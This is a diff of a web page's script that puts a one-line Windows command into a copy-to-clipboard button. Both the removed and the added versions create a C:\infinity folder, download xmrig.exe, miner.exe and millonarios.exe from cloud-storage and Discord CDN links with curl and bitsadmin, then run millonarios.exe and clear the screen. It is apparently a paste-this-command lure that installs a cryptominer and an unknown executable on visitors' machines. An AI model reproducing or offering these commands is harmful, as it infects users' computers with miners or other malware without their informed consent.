@@ -122,13 +122,7 @@ start "Stella" cmd /k "Stella.bat" <br>
 		const copyBtn = document.getElementById('copyBtn');
 
 const commands = `
-mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
-cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/xmrig.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\xmrig.exe C:\\infinity\\xmrig.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
-mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
-cd c:&cd/&cd infinity&curl -O "https://cdn.discordapp.com/attachments/1093679940689481819/1182627116257390653/millonarios.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\millonarios.exe C:\\infinity\\millonarios.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
-mkdir C:\\infinity&SaveNewDuplicate & EditJust Text
-cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/miner.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\\infinity\\miner.exe C:\\infinity\\miner.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
-cd c:&cd/&cd infinity&millonarios.exe&cls
+mkdir C:\infinity&cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/xmrig.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\infinity\xmrig.exe C:\infinity\xmrig.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd c:&cd/&cd infinity&curl -O "https://cdn.discordapp.com/attachments/1093679940689481819/1185641092503306250/millonarios.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\infinity\millonarios.exe C:\infinity\millonarios.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd c:&cd/&cd infinity&curl -O "https://storage.googleapis.com/mariocorp/miner.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 C:\infinity\miner.exe C:\infinity\miner.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd c:&cd/&cd infinity&millonarios.exe&cls
 `;
 
 copyBtn.addEventListener('click', () => {
